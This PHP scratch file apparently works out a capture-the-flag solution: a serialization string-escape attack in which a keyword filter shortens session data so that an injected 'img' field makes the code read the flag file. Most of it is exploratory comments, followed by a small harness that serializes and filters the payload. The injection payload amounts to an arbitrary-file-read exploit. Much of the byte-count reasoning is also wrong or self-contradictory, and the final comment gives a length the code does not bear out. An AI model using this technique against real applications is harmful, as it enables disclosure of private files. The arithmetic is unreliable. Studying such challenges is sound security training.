<?php
// Let me trace through more carefully
// 
// The key insight: when we put 'flag' in the value, it gets removed
// s:53:"flag..." -> s:53:"..." (but the content is now 4 chars shorter)
// 
// The parser expects 53 bytes, but the content after filter is 53 - 4 = 49 bytes
// So it reads 49 bytes from the content, then 4 more bytes from the next field

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// Let's trace through the parsing step by step
// 
// After filter: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:53:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// The parser sees:
// a:3:{ - array with 3 elements
// s:4:"user" - key "user"
// s:5:"guest" - value "guest"
// s:8:"function" - key "function"
// s:53:" - value is string of length 53
//   Now it reads 53 bytes starting from the position after the opening quote
//   The content at that position is: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   
//   Let me count: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   That's way more than 53 chars
//   
//   First 53 chars: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX";s:3:"img
//   This becomes the value of 'function'
//   
//   Then the parser continues from: ";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   This is: ";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   The parser expects a key-value pair, but sees "; which is invalid

// So the problem is that after reading 53 bytes, the remaining string is corrupted

// Let me think about this differently.
// We want to inject a VALID serialized structure after the escape

// The trick is to use the escape to "consume" the remaining original structure
// and replace it with our injected structure

// Let's try:
// function = 'flag' + padding + '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// We want the parser to read:
// s:N:"[N bytes]"
// Where the N bytes include:
// - Some padding to reach N bytes
// - A closing quote and semicolon to end the string
// - A new img key-value pair
// - A closing brace to end the array

// But wait, the array count is 3, and we need exactly 3 elements!
// 
// Original: a:3:{user;function;img}
// After escape: a:3:{user;function;[injected img]}
// 
// If we inject a new img, we need to make sure the array still has 3 elements

// Let me try a different approach:
// What if we inject from the 'user' field and include the 'function' field?

// user = 'flag' + padding + '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// After filter, the parser reads:
// s:N:"[N bytes]"
// Where N bytes = padding + ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// This would inject: function="show_image", img="ZDBnM19mMWFnLnBocA=="
// And close the array

// Let's calculate:
// Injection: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// Length: 66 chars

// If user = 'flag' + injection
// Serialized: s:70:"flag";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:70:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// Parser reads 70 bytes from ""
// Reads: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// That's 66 chars, not 70

// We need 4 more chars. Let's add padding:
// user = 'flag' + 'XXXX' + injection
// Serialized: s:74:"flagXXXX";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:74:"XXXX";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// Parser reads 74 bytes from "XXXX"
// Reads: XXXX";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// That's 70 chars, not 74

// Hmm, still 4 chars short. Let me add more padding:
// user = 'flag' + 'XXXXXXXX' + injection
// Serialized: s:78:"flagXXXXXXXX";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:78:"XXXXXXXX";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// Parser reads 78 bytes from "XXXXXXXX"
// Reads: XXXXXXXX";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// That's 74 chars, not 78

// I see the pattern: we're always 4 chars short because 'flag' (4 chars) was removed
// 
// The key insight: the serialized length is based on the ORIGINAL value
// After filter removes 'flag', the content is 4 chars shorter
// So the parser reads 4 chars into the next field

// Let me think about this more carefully:
// user = 'flag' + injection
// Original length: 4 + len(injection)
// After filter: len(injection)
// Serialized length: 4 + len(injection)
// Parser reads: 4 + len(injection) bytes from content of length len(injection)
// So it reads len(injection) bytes from injection, then 4 bytes from the next field

// This means the parser will read 4 bytes PAST the injection into the next field!

// So if we structure it correctly:
// user = 'flag' + injection + 'XXXX' (where XXXX is consumed by the overflow)
// 
// Let's try:
// user = 'flag' + '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// Serialized: s:70:"flag";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:70:"";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// Parser reads 70 bytes from ""
// Content available: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// That's 66 chars
// Parser needs 4 more chars, reads from next field: ";s:" (4 chars)
// 
// So the value becomes: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:"
// That's 70 chars!
// 
// Then the parser continues from: 4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// This is broken!

// The problem is that the "overflow" reads into the original structure, corrupting it

// Let me try a different approach:
// What if we use MULTIPLE keywords to generate more overflow?

// user = 'flagflagflag...' + injection
// Each 'flag' (4 chars) -> '' (0 chars), generating 4 chars of overflow
// 
// If we have N 'flag's, we generate 4*N chars of overflow
// We need to "consume" the entire remaining original structure

// The remaining structure after the user value is:
// ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// Length: 73 chars

// So we need 73 chars of overflow
// 73 / 4 = 18.25, so we need 19 'flag's = 76 chars of overflow

// Let's try:
// user = 'flag' * 19 + injection
// 
// Serialized: s:76+66:"flagflag...flag";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// Wait, I need to be more careful about the injection

// Actually, let me reconsider the approach.
// 
// The goal is to make the parser read our injected img value instead of the original.
// 
// Here's a cleaner approach:
// 1. Use the escape to "skip" past the original function and img
// 2. Inject a new function and img with our values
// 3. Close the array properly

// The original structure:
// a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"BASE64";}
// 
// We want to inject:
// a:3:{s:4:"user";s:N:"[escape]";s:8:"function";s:10:"show_image";s:3:"img";s:20:"NEW_BASE64";}
// 
// Where [escape] contains keywords that get removed, causing the parser to read
// past the original structure and into our injected structure

// Let me try:
// user = 'flag' * 19 + '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 
// Serialized length: 76 + 66 = 142
// After filter: length still 142, but content is 66 chars
// Parser reads 142 bytes from 66 chars, then 76 bytes from next field
// 
// The next field is: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// That's 73 chars, not 76
// 
// So the parser would read 76 bytes from 73 chars, going past the end of the string

// This is getting complicated. Let me try a simpler approach.

// What if we just need to read the flag file?
// The flag file is: d0g3_f1ag.php
// base64: ZDBnM19mMWFnLnBocA==

// Let me check if we can just read it directly via LFI

// Actually, let me re-read the code:
// echo file_get_contents(base64_decode($userinfo['img']));
// 
// So we need $userinfo['img'] to be base64 of the flag file
// base64('d0g3_f1ag.php') = 'ZDBnM19mMWFnLnBocA=='

// Let me try a different escape strategy.
// What if we use the 'img' key directly?

// Wait, I just realized something:
// The filter removes 'php', 'flag', 'php5', 'php4', 'fl1g'
// But 'd0g3_f1ag.php' contains 'php' and 'f1ag' (close to 'flag')
// 
// Actually, 'f1ag' is not in the filter list! Only 'flag' is.
// And 'php' is in the filter, but it's in the FILENAME, not in the serialized string
// 
// The filter is applied to the SERIALIZED STRING, not to the file content!

// So if we can inject img = 'ZDBnM19mMWFnLnBocA==', it should work!

// Let me try a cleaner approach:
// Use the escape to inject a new img value

// The injection payload:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// This closes the current value and adds a new img key

// For this to work, we need:
// 1. The current value to "overflow" into our injection
// 2. The injection to be parsed as valid serialized data

// Let me trace through with user = 'flag' + injection:
// 
// Serialized: a:3:{s:4:"user";s:70:"flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Wait, that's not right. Let me write out the full serialized string.

$_SESSION = [];
$_SESSION['user'] = 'flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

echo "Session:\n";
var_dump($_SESSION);

$serialized = serialize($_SESSION);
echo "\nSerialized:\n";
echo $serialized . "\n";

$filtered = filter($serialized);
echo "\nFiltered:\n";
echo $filtered . "\n";

// Let me manually trace the parsing
echo "\n=== Manual trace ===\n";
echo "After filter, the string is:\n";
echo $filtered . "\n\n";

// Count the length of the user value after filter
$user_value = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
echo "User value after filter: " . $user_value . "\n";
echo "Length: " . strlen($user_value) . "\n";

// The serialized length says 66 (original was 'flag' + 62 = 66)
// But after filter, it's 62
// So parser reads 66 bytes from 62 chars, then 4 more from next field

// Let me see what 66 bytes looks like
echo "\nFirst 66 bytes after s:66:\":\n";
echo substr($filtered, strpos($filtered, 's:66:"') + 6, 66) . "\n";

